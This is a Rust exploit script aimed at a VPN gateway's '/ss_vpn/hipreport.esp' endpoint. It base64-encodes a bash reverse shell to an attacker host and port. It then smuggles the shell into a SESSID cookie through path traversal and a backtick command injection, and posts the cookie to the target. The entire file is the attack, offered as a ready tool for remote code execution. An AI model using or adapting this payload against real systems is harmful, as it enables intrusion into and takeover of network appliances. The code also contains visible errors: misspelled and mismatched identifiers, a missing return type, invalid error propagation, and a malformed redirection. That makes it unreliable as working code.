use reqwest::blocking::Client;
use reqwest::header::{HeaderMap};
use reqwest_cookie_store::{CookieStore, CookieStoreMutex};
use base64::{Engine as _, engine::general_purpose};
use std::sync::Arc;
use url::URL;
use tokio;


fn genreate_reverse_shell(lhost: &str, lport:&str)
{
    let reverse_shell_command = format!("bash -i >& /dev/tcp/{}/{} 0>1",lhost,lport);
    general_purpose::STANDARD.encode(reverse_shell_command)
}
#[tokio::main]
async fn async_main()
{
    
    let mut headers = HeaderMap::new();
    let ip = "127.0.0.1";
    let lhost = "127.0.0.1";
    let lport = "4444";
    let cookie_store = CookieStore::new(None);
    let cookie_store = CookieStoreMutex::new(cookie_store);
    let mut encoded_reverse_shell =genreate_reverse_shell(&lhost,&lport);
    let sessid =format!("/../../../../opt/panlogs/tmp/device_telemetry/minute/aaa`echo${{IFS}}{}|base64${{IFS}}-d|bash",encoded_reverse_shell);
{
    let mut store = cookie_store.lock().unwrap();
    let cookie = CookieStore::Cookie::build("SESSID",sessid)
    .domain(format!("https://{}/ss_vpn/hipreport.esp",ip))
    .path("/")
    .secure(true)
    .finish();
store.insert_raw(&cookie, &Url::parse(format!("https://{}/ss_vpn/hipreport.esp",ip))?)?;
}    
    let client = Client::builder().cookie_provider(Arc::clone(&cookie_store)).build()?;
    let response = client.post(format!("https://{}/ss_vpn/hipreport.esp",ip));

println!("Status: {}",response.status());
let body=response.text().await?;
println!("Body:\n{}",body);


}
fn main()
{
    tokio::runtime::Runtime::new().unwrap().block_on(async_main());
}